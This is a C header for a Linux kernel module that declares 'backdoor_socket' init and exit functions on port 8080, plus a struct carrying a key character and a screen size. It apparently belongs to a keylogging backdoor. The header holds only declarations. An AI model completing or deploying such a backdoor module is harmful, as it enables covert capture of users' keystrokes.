#ifndef SOCKET_H
#define SOCKET_H

#include <linux/module.h>

#define BUFFER_SIZE 4096
#define SERVER_PORT 8080

typedef struct SentData
{
    char key;
    int screen_size[2];
} sent_data;

int __init backdoor_socket_init(int port);
void __exit backdoor_socket_exit(void);

#endif